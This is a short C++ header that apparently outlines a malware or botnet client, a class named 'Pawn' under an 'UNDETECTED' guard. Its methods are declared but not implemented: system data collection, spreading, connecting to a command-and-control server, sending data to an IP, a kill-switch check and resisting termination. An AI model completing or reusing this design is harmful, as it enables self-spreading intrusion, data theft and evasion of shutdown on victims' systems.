//
// Created by nn5h on 7/23/19.
//

#ifndef UNDETECTED_PAWN_H
#define UNDETECTED_PAWN_H

#include "CollectSystemData.h"
#include "NetworkOperations.h"
#include "Helper.h"


class Pawn {

public:
    SystemDataCollector systemData;

    Pawn();
    ~Pawn();

    bool sendMySelfData();
    bool spread();
    void doWork();
    bool checkSWKill();
    bool connect2CC();
    bool sendData2IP();
    void preventKill();
};


#endif //UNDETECTED_PAWN_H
